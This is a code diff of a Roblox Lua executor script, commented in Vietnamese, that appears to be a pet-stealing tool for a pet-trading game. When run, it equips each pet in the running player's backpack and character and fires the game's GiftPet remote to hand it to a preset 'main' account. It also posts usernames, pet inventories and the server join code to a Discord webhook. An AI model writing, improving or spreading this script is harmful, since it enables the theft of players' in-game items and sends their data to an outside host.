@@ -1,7 +1,17 @@
--- ⚙️ CONFIG
+-- ✅ Script đã khởi động
+print("✅ Script đã khởi động trên executor này!")
+
 local MAIN_USER_ID = tonumber(getgenv().id)
 local WEBHOOK_URL = tostring(getgenv().webhook or "")
 
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Danh sách pet có thể gift
 local PET_NAMES = {
     "Bunny", "Dog", "Golden Lab", "Bee", "Black Bunny", "Cat", "Chicken", "Deer",
     "Monkey", "Orange Tabby", "Pig", "Rooster", "Spotted Deer", "Honey Bee", "Cow",
@@ -11,14 +21,7 @@ local PET_NAMES = {
     "Butterfly", "Dragon Fly", "Queen Bee", "Disco Bee"
 }
 
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local LocalPlayer = Players.LocalPlayer
-
--- 🔍 Tìm player chính
+-- Tìm player chính trong server
 local function getMainPlayer()
     for _, p in ipairs(Players:GetPlayers()) do
         if p.UserId == MAIN_USER_ID then
@@ -28,26 +31,27 @@ local function getMainPlayer()
     return nil
 end
 
--- 📦 Lấy danh sách pet
+-- Tìm pet trong Backpack hoặc Character
 local function getAllValidPetTools()
-    local Backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
-    local results = {}
-
-    for _, tool in ipairs(Backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            for _, petName in ipairs(PET_NAMES) do
-                if tool.Name:match("^" .. petName) then
-                    table.insert(results, {tool = tool, name = petName})
-                    break
+    local tools = {}
+    for _, container in ipairs({LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character}) do
+        if container then
+            for _, tool in ipairs(container:GetChildren()) do
+                if tool:IsA("Tool") then
+                    for _, petName in ipairs(PET_NAMES) do
+                        if tool.Name:match("^" .. petName) then
+                            table.insert(tools, {tool = tool, name = petName})
+                            break
+                        end
+                    end
                 end
             end
         end
     end
-
-    return results
+    return tools
 end
 
--- 🧍‍♂️ Di chuyển đến main
+-- Move đến người chơi chính
 local function moveToPlayer(target)
     local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
     local tgt = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
@@ -60,13 +64,13 @@ local function moveToPlayer(target)
     end
 end
 
--- 🎁 Gift pet
+-- Gift pet
 local function giftPetTo(player, petName)
     local giftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
     giftRemote:FireServer(player, petName)
 end
 
--- 🔁 Gift tất cả pet
+-- Gift toàn bộ pet đang có
 local function autoGiftAllPets(mainPlayer)
     local pets = getAllValidPetTools()
     if #pets == 0 then return end
@@ -77,31 +81,40 @@ local function autoGiftAllPets(mainPlayer)
         local tool = pet.tool
         local petName = pet.name
 
-        LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(tool)
+        -- Trang bị tool
+        pcall(function()
+            LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(tool)
+        end)
         task.wait(0.2)
 
+        -- Gift pet
         giftPetTo(mainPlayer, petName)
         task.wait(0.5)
     end
 end
 
--- 📩 Gửi webhook Discord
+-- Lấy danh sách pet để gửi webhook
 local function getPetList(player)
-    local list = {}
-    local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            for _, petName in ipairs(PET_NAMES) do
-                if tool.Name:match("^" .. petName) then
-                    table.insert(list, tool.Name)
-                    break
+    local result = {}
+    local containers = {player:FindFirstChild("Backpack"), player.Character}
+    for _, container in ipairs(containers) do
+        if container then
+            for _, tool in ipairs(container:GetChildren()) do
+                if tool:IsA("Tool") then
+                    for _, petName in ipairs(PET_NAMES) do
+                        if tool.Name:match("^" .. petName) then
+                            table.insert(result, tool.Name)
+                            break
+                        end
+                    end
                 end
             end
         end
     end
-    return list
+    return result
 end
 
+-- Gửi thông tin người chơi vào Discord webhook
 local function sendWebhook(player)
     if WEBHOOK_URL == "" then return end
 
@@ -113,33 +126,34 @@ local function sendWebhook(player)
             fields = {
                 { name = "👤 Username", value = player.DisplayName .. " (`" .. player.Name .. "`)", inline = false },
                 { name = "🎲 Game", value = gameName, inline = false },
-                { name = "📦 Danh sách pet", value = #petList > 0 and table.concat(petList, "\n") or "Không có pet", inline = false },
+                { name = "📦 Pet đang sở hữu", value = #petList > 0 and table.concat(petList, "\n") or "Không có pet", inline = false },
                 { name = "🔗 Join Code", value = game.JobId or "Không rõ", inline = false }
             },
             color = 65280
         }}
     }
 
-    local success, err = pcall(function()
-        local req = {
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(content)
-        }
-        if syn then syn.request(req)
-        elseif http_request then http_request(req)
-        elseif request then request(req) end
-    end)
+    local req = {
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(content)
+    }
 
-    if success then
+    local sent = false
+    if syn and syn.request then syn.request(req); sent = true
+    elseif http_request then http_request(req); sent = true
+    elseif request then request(req); sent = true
+    end
+
+    if sent then
         print("✅ Webhook đã gửi.")
     else
-        warn("❌ Lỗi webhook:", err)
+        warn("⚠️ Không gửi được webhook - executor không hỗ trợ.")
     end
 end
 
--- 📥 Khi player mới vào
+-- Khi có người chơi mới
 Players.PlayerAdded:Connect(function(player)
     task.wait(3)
     sendWebhook(player)
@@ -148,17 +162,4 @@ Players.PlayerAdded:Connect(function(player)
         task.wait(6)
         autoGiftAllPets(player)
     end
-end)
-
--- 🔁 Chờ đến khi acc main vào (check mỗi 5 giây)
-task.spawn(function()
-    local found = getMainPlayer()
-    while not found do
-        print("⏳ Đang chờ main account vào...")
-        task.wait(5)
-        found = getMainPlayer()
-    end
-
-    task.wait(6)
-    autoGiftAllPets(found)
 end)
